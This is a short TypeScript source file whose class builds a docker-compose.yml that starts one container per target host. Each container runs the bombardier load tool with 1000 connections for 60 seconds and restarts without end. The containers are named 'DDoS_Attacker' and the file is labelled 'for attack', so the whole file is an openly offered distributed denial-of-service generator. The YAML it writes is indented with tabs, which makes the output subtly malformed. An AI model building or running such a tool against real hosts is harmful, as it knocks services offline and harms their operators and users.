import fs from "fs";

/**
 * This is used to generate and save file for attack
 */
export class FileGenerator {
    private targets: string[] = [];
    private SAVE_DIR = 'attackTargets';
    private FILE_NAME = 'docker-compose.yml';

    constructor(options: {
        targets: string[],
    }) {
        this.targets = options.targets;
    }

    public generateAndSave() {
        const filepath = this.SAVE_DIR + "/" + this.FILE_NAME;
        let fileContent = "";

        fileContent+= "version: \"3.9\"\n";
        fileContent+= "services:\n";
        // fileContent+= "";
        // fileContent+= "";

        for (let i = 0; i < this.targets.length; i++) {
            fileContent+= `\ts${i}:\n`;
            fileContent+= "\t\timage: alpine/bombardier\n";
            fileContent+= `\t\tcontainer_name: \"DDoS_Attacker_${i}\"\n`;
            fileContent+= `\t\tcommand: [ \"-c\", \"1000\", \"-d\", \"60s\", \"-l\", \"${this.targets[i]}\" ]\n`;
            fileContent+= "\t\trestart: \"always\"\n";
        }

        console.log('Saving into file: ', filepath);
        fs.writeFileSync(filepath, fileContent);
    }
}
